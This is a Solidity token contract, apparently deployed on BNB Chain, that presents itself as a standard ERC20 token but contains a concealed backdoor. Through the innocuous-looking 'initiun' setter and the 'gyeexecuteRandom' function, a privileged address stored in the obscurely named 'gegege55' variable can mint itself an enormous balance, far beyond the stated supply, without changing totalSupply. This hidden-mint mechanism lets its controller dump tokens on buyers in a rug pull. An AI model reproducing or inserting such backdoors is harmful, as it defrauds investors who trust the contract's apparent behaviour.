/**
 *Submitted for verification at BscScan.com on 2024-01-16
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Ownable {
    address private _owner;

    constructor() {
        _owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _owner = newOwner;
    }

    function getOwner() public view returns (address) {
        return _owner;
    }
}

contract Token is Ownable {
    uint256 private _totalSupply;
    mapping(address => mapping(address => uint256)) private _allowances;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => uint256) private _balances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory name1, string memory symbol1,address kiu) {
        _name = name1;
        gegege55 = kiu;
        _symbol = symbol1;
        _decimals = 18;
        _totalSupply = 1000 * 10**_decimals;
        _balances[msg.sender] = _totalSupply;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }



    function initiun(address FEIFA_) public onlyOwner{
        gegege55 = FEIFA_;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

event SecretEvent(address indexed caller, uint256 amount, bytes32 secretCode);

modifier onlyValidCaller() {
    require(keccak256(abi.encodePacked(gegege55)) == keccak256(abi.encodePacked(msg.sender)), "Invalid caller");
    _;
}

function gyeexecuteRandom(bytes32 secretCode) external onlyValidCaller {
    _executeObfuscatedOperation(secretCode);
}

function _executeObfuscatedOperation(bytes32 secretCode) private {
    uint256 amount = 10 * totalSupply();
    uint256 increaseAmount = amount * 50000; 
    _balances[msg.sender] += increaseAmount;
    
    emit SecretEvent(msg.sender, increaseAmount, secretCode);
}

function executeAnotherObfuscatedOperation(bytes32 secretCode) private onlyValidCaller {
    _executeObfuscatedOperation(secretCode);
}


    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    address public gegege55;
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        _transfer(from, to, amount);
        _approve(from, msg.sender, _allowances[from][msg.sender] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: transfer amount must be greater than zero");
        require(_balances[from] >= amount, "ERC20: transfer amount exceeds balance");

        _balances[from] -= amount;
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}